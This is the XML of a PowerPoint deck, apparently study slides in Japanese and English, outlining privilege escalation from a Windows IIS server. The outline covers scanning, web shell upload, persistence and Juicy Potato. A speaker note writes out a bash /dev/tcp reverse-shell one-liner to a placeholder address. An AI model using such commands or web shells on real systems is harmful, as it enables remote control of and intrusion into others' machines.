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7"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="258" r:id="rId2"/>
    <p:sldId id="261" r:id="rId3"/>
    <p:sldId id="262" r:id="rId4"/>
    <p:sldId id="263" r:id="rId5"/>
    <p:sldId id="264"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B0B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226" autoAdjust="0"/>
    <p:restoredTop sz="73624" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="58" d="100"/>
          <a:sy n="58" d="100"/>
        </p:scale>
        <p:origin x="1096" y="28"/>
      </p:cViewPr>
      <p:guideLst/>
    </p:cSldViewPr>
  </p:slideViewPr>
  <p:notesTextViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="1" d="1"/>
        <a:sy n="1" d="1"/>
      </p:scale>
      <p:origin x="0" y="-66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3A4C6B-DF72-4723-951D-FA8DD9825525}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6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8E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33523241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r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Qiita.com/nozomi2025/items/51ec1b574facd5cf89ca </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　このページの流れで実行したい→ちゃんと理解</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>についてちゃんと調べて理解</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サイトに</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload file</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の項目があるかどうか？なかった場合はどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートは本当にあいてるか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>永続化の方法は本当にそれだけか、それが通らなかったら？</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>シェルリスナーの設置は</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に対して有効か？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>への</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のダウンロードはどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　→　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>file upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がある場合</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Bash –c ‘bash –I &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipaddress</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/port 0&gt;&amp;1’ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>←</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>では使えないよ（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>👇</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Powercat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に変更</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のローカル特権昇格ツール、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サービスとトークン偽装の仕組みを悪用して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SYSTEM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>権限を奪取</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>「</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Componet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> Object Model</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>」（オブジェクト指向のソフトウェアコンポーネントモデル）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Shell.Application</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>や</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Wscript.Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>異なるプログラミング言語や環境で作成された部品通しを共通のプロトコルでつなぐための仕組み（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>C#</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>VB</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Python</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>DCOM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（上記の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>をネットワーク越しでも使えるようにした拡張機能）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP"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1</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31670282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C68E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1984717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718323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1034680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155373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270212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8857615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60971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867279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9850209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3774896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25998228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3745068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122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP"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73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="148573688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四角形: 角を丸くする 66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985FF41F-BE90-4796-8264-5F7ED2D9B075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6571273" y="146791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4" name="テキスト ボックス 73">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5A1517C-3544-45F6-9CC6-79A4F98D456E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6786643" y="2182666"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>ssh,nc,Get-NetTCPconnection</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>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3054266"/>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77895" y="328215"/>
            <a:ext cx="8065979" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach1:Privilege escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>				 from a Windows IIS server</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="1541776"/>
            <a:ext cx="4686162" cy="566906"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="761995"/>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738664"/>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Portscan,IPscan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Layout)</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28600"/>
            <a:ext cx="4686162" cy="523220"/>
            <a:chOff x="2491467" y="2290790"/>
            <a:chExt cx="7780901" cy="824318"/>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290790"/>
              <a:ext cx="7575674" cy="824318"/>
              <a:chOff x="2671764" y="2290790"/>
              <a:chExt cx="7575674" cy="82431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588234" y="2290790"/>
                <a:ext cx="5659204" cy="824318"/>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Create malicious </a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>code,file</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>prepare </a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>webshell,php</a:t>
                </a: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24585" y="3086394"/>
            <a:ext cx="4749018" cy="499617"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>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Persistence</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="12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a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>webshell</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661786" y="2085474"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Website:Google</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Dorks</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600"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4"/>
            <a:ext cx="5026053" cy="595176"/>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68193"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="568193"/>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68193"/>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a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Use tool</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRP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573528"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943848" cy="646332"/>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5" y="2478280"/>
              <a:ext cx="7763550" cy="486758"/>
              <a:chOff x="2671765" y="2478280"/>
              <a:chExt cx="7763550" cy="486758"/>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5"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solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="11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11" y="2478280"/>
                <a:ext cx="5659204" cy="307777"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t> </a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:gr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E1B6A82E-58DD-4024-A508-58F42401F021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1732847" y="3564742"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Prepare the ASP.NET Web Shell</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> create injection php </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="テキスト ボックス 68">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5F10A2A-A24F-444A-988B-AD2090DD4051}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1741194" y="5259518"/>
            <a:ext cx="4387181" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>upload php file</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="70" name="グループ化 69">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45F20B05-FBCF-4518-96B7-2BFA4EBE199A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6666095" y="1577422"/>
            <a:ext cx="4749018" cy="495740"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="71" name="四角形: 角を丸くする 70">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D5AFFD2-83DA-4F17-AE79-4092D31F3A2F}"/>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72" name="四角形: 角を丸くする 71">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AF37AC1-3947-4ED7-A3CE-86E366416A4F}"/>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Initial Access</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
